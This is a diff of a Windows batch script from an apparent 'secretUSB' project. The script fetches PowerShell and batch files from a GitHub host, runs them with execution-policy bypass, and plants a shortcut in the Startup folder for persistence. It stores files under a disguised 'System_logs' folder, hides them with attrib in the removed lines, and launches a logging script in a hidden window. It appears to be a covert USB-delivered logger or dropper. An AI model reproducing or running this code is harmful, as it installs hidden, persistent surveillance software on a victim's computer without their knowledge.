@@ -91,16 +91,11 @@ curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/logs.bat
 curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/logs.ps1
 curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/raccourci.ps1
 
-powershell.exe -ExecutionPolicy Bypass -File C:\Users\Val\Desktop\raccourci.ps1
+powershell.exe -ExecutionPolicy Bypass -File raccourci.ps1
 
+move C:\logs.lnk "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 
-powershell.exe -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\%~logs.lnk');$s.TargetPath='%~logs.bat';$s.Save()"
-
-attrib +h %USERPROFILE%\AppData\Roaming\System_logs
-attrib +h %USERPROFILE%\AppData\Roaming\System_logs\logs.bat
-attrib +h %USERPROFILE%\AppData\Roaming\System_logs\logs.ps1
-attrib +h %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\logs.lnk
-
+del %USERPROFILE%\AppData\Roaming\System_logs\raccourci.ps1
 
 
 Powershell.exe -NoLogo -WindowStyle Hidden -executionpolicy remotesigned -File  %USERPROFILE%\AppData\Roaming\System_logs\logs.ps1
